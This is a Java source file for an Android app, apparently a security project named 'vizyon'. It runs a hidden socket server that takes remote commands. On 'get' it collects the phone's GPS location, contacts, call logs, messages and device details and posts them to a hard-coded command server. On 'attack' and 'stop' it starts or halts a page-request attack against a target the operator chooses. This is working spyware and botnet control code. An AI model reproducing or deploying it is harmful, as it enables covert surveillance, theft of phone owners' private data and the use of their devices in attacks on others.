package com.csec.vizyon;

import android.content.ContentResolver;
import android.content.Context;
import android.os.Looper;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.DataInputStream;
import java.io.IOException;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;
import java.util.Enumeration;

/**
 * Created by justburcel on 19/01/2016.
 */
public class Server {
    ServerSocket serverSocket;
    static final int socketServerPORT = 6666;
    String serverIp = "192.168.1.102";
    String localIp;
    Context context;
    ContentResolver contentResolver;
    GoToPage goToPage;
    String TAGSERVER = "Server";

    String getCommand = "get";
    String getCommandAll = "all";
    String getCommandUtils = "utils";
    String getCommandGps = "gps";
    String getCommandContacts = "contacts";
    String getpCommandMessages = "messages";
    String attackCommand = "attack";
    String stopCommand = "stop";


    //data
    JSONObject data = new JSONObject();
    JSONArray contactsJson = new JSONArray();
    JSONObject utilsJson = new JSONObject();
    JSONObject gpsJson = new JSONObject();
    JSONArray callLogsJson = new JSONArray();
    JSONObject messagesJson = new JSONObject();

    public Server(Context context, ContentResolver contentResolver) {
        Thread socketServerThread = new Thread(new SocketServerThread());
        socketServerThread.start();
        this.context = context;
        this.contentResolver = contentResolver;
        localIp = getIpAddress();
    }

    public int getPort() {
        return socketServerPORT;
    }

    public void closeServerSocket() {
        if (serverSocket != null) {
            try {
                serverSocket.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    private class SocketServerThread extends Thread {

        @Override
        public void run() {
            try {
                Log.i(TAGSERVER, "Socket is waiting on port: " + socketServerPORT);
                Looper.prepare();   //due to runtime error
                // create ServerSocket using specified port
                serverSocket = new ServerSocket(socketServerPORT);

                while(true){
                    Socket socket = serverSocket.accept();
                    DataInputStream dataInputStream = new DataInputStream(socket.getInputStream());
                    String message = dataInputStream.readUTF();
                    Log.i(TAGSERVER, "From " + socket.getInetAddress() + ":" + socket.getPort() + " message: " + message);
                    dataInputStream.close();
                    socket.close();

                    String[] messageParts = null;
                    if(message.contains(",")){
                        messageParts = message.split(",");

                        if(messageParts[0].equalsIgnoreCase(getCommand)){

                            if(messageParts[1].equalsIgnoreCase(getCommandAll)){
                                readGPS();
                                readContacts();
                                readUtils();
                                readCallLogs();
                                readMessages();
                                try {
                                    data = new JSONObject();
                                    data.put("ip", localIp);
                                    data.put("gps", gpsJson);
                                    data.put("callLog", callLogsJson);
                                    data.put("utils", utilsJson);
                                    data.put("contacts", contactsJson);
                                    data.put("messages", messagesJson);
                                } catch (JSONException e) {
                                    e.printStackTrace();
                                }
                            }
                            else if(messageParts[1].equalsIgnoreCase(getCommandUtils)){
                                readUtils();
                                try {
                                    data = new JSONObject();
                                    data.put("ip", localIp);
                                    data.put("utils", utilsJson);
                                } catch (JSONException e) {
                                    e.printStackTrace();
                                }
                            }
                            else if(messageParts[1].equalsIgnoreCase(getCommandGps)){
                                readGPS();
                                try {
                                    data = new JSONObject();
                                    data.put("ip", localIp);
                                    data.put("gps", gpsJson);
                                } catch (JSONException e) {
                                    e.printStackTrace();
                                }
                            }
                            else if(messageParts[1].equalsIgnoreCase(getCommandContacts)){
                                readContacts();
                                try {
                                    data = new JSONObject();
                                    data.put("ip", localIp);
                                    data.put("contacts", contactsJson);
                                } catch (JSONException e) {
                                    e.printStackTrace();
                                }
                            }
                            else if(messageParts[1].equalsIgnoreCase(getpCommandMessages)){
                                readContacts();
                                try {
                                    data = new JSONObject();
                                    data.put("ip", localIp);
                                    data.put("messages", messagesJson);
                                } catch (JSONException e) {
                                    e.printStackTrace();
                                }
                            }
                            //TODO: Parse get command and send POST request
                            //this request is async so you will have to execute this after every parsing operation is finished.
                            new Request().execute("http://" + serverIp + ":8080/Csec/Servlet", data.toString());
                        }
                        else if(messageParts[0].equalsIgnoreCase(attackCommand) && messageParts.length > 2){
                            Log.i(TAGSERVER, "Attack will be started by:");
                            Log.i(TAGSERVER, messageParts[1]);  //server
                            Log.i(TAGSERVER, messageParts[2]);  //time
                            goToPage = new GoToPage(messageParts[1], Integer.parseInt(messageParts[2]));
                            goToPage.start();
                            Log.i(TAGSERVER, "Attack is start successfully");
                        }
                        else if(messageParts[0].equalsIgnoreCase(stopCommand)){
                            if (goToPage != null){
                                Log.i(TAGSERVER, "Attack will be stopped...");
                                goToPage.stop();
                                Log.i(TAGSERVER, "Attack is stopped successfully");
                            }else{
                                Log.i(TAGSERVER, "Attack cannot be stopped!");
                            }
                        }
                    }
                }

            } catch (IOException e) {
                e.printStackTrace();
            }
        }

        public void readGPS(){
            GPSTracker gps = new GPSTracker(context);
            if(gps.canGetLocation()) {
                gpsJson = gps.getGps();
            }
        }

        public void readContacts(){
            Contacts contacts = new Contacts(contentResolver);
            contactsJson = contacts.getAllContacts();
        }

        public void readUtils(){
            Utils utils = new Utils(context);
            utilsJson = utils.getUtils();
        }

        public void readCallLogs(){
            CallLogs calllogs= new CallLogs(contentResolver);
            callLogsJson = calllogs.getCallLogs();
        }

        public void readMessages(){
            Tickets messages= new Tickets();
            messagesJson = messages.getTickets(context);
        }
    }

    public String getIpAddress() {
        String ip = "";
        try {
            Enumeration<NetworkInterface> enumNetworkInterfaces = NetworkInterface.getNetworkInterfaces();
            while (enumNetworkInterfaces.hasMoreElements()) {
                NetworkInterface networkInterface = enumNetworkInterfaces.nextElement();
                Enumeration<InetAddress> enumInetAddress = networkInterface.getInetAddresses();
                while (enumInetAddress.hasMoreElements()) {
                    InetAddress inetAddress = enumInetAddress.nextElement();
                    if (inetAddress.isSiteLocalAddress()) {
                        ip = inetAddress.getHostAddress();
                    }
                }
            }
        } catch (SocketException e) {
            e.printStackTrace();
        }
        return ip;
    }
}